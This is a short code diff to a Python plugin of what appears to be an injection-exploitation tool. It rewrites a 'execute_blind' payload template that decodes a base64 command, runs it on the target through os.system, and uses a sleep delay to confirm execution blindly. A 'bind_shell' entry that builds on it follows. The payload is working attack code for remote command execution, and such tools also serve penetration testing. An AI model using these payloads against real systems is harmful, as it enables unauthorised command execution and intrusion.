@@ -69,7 +69,7 @@ class Python(Plugin):
             },
             'execute_blind': {
                 'call': 'evaluate',
-                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
+                'execute_blind': """__import__('os').system(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) == 0 and __import__('time').sleep({delay})"""
             },
             'bind_shell': {
                 'call': 'execute_blind',
